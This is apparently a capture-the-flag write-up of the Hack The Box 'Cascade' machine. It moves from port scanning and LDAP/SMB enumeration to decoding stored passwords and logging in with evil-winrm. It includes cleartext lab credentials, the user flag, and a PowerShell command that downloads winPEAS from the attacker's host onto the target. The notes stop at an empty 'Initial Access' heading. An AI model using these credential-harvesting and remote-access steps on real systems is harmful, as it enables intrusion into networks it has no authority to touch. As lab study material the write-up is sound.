+++
title = "HTB - Cascade (I)"
date = 2024-09-16
+++

### Scan
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
```
### Enumeration
no zone transfer
no smb (map or client)
enum4linux users hit (via rpcclient) <img alt="Image" async src="images/Screenshot 2024-09-16 at 1.37.17 PM.png" width="800px"></img>
group hit (via rpcclient)<img alt="Image" async src="images/Screenshot 2024-09-16 at 1.39.11 PM.png" width="800px"></img>
Password Policy Info <img alt="Image" async src="images/Screenshot 2024-09-16 at 1.37.53 PM.png" width="800px"></img>
Dump users into a file, grep and clean, then use script to asrep roast.
ASREP roast came back with nothing.
weak password policy, want to try and crack... Too much. Enumerate thoroughly, exploit simply. I'm missing something
LDAP dump with `ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.182`
Reallllllly look. Ryan encoded password. Looks like BASE64 <img alt="Image" async src="images/Screenshot 2024-09-16 at 2.20.37 PM.png" width="800px"></img>
Decode with online decoder, password is `rY4n5eva`
Time to re-enumerate shares with `smbmap -H cascade.htb -u "user" -p "pass"`
<img alt="Image" async src="images/Screenshot 2024-09-16 at 2.32.54 PM.png" width="800px"></img>
Only share we have access to is IT. Interesting email, log files, but really interesting s.smith files
<img alt="Image" async src="images/Screenshot 2024-09-16 at 2.40.59 PM.png" width="800px"></img>
Email disclosing TempAdmin w/ possible brute password <img alt="Image" async src="images/Screenshot 2024-09-16 at 2.42.21 PM.png" width="800px"></img>
Hex password and possible VNC service escalation<img alt="Image" async src="images/Screenshot 2024-09-16 at 2.49.23 PM.png" width="800px"></img>
Regular hex decoding didn't work, but there is a VNC decrypt tool for it. Which other box used this?
Encode and create the crackable file, as the tool only takes ciphertext: `echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc.psd`
`sT333ve2` Password <img alt="Image" async src="images/Screenshot 2024-09-16 at 3.08.13 PM.png" width="800px"></img>
We've got two sets of credentials now.  `s.smith:sT333ve2` and `r.thompson:rY4n5eva`
Re-Enumerate
Steve's credentials grant us access to Audit$ share (smbmap script like above)<img alt="Image" async src="images/Screenshot 2024-09-16 at 3.12.16 PM.png" width="800px"></img>
Gain access by `smbclient //10.10.10.182/Audit$ --user s.smith%sT333ve2`
Download two files<img alt="Image" async src="images/Screenshot 2024-09-16 at 3.19.16 PM.png" width="800px"></img>
evilwinrm as smith `evil-winrm -i 10.10.10.182 -u s.smith -p 'sT333ve2'`<img alt="Image" async src="images/Screenshot 2024-09-16 at 3.20.01 PM.png" width="800px"></img>
Local Proof<img alt="Image" async src="images/Screenshot 2024-09-16 at 3.21.01 PM.png" width="800px"></img>
`USER:8685e71cafb4e133d985dc08c223401c`

Big Oof trying to transfer with SMB and CertUtil. Crashed box twice. Python worked though. Serve WinPEAS
`powershell "Invoke-WebRequest -UseBasicParsing 10.10.14.3:80/winPEASany.exe -OutFile winPEAS.exe`

Serve bloodhound ingester remotely as well. `bloodhound-python -d cascade.local -u s.smith -p sT333ve2 -ns 10.10.10.182 -c all`

Nothing from bloodhound as far as I can tell. WinPEAS?






### Initial Access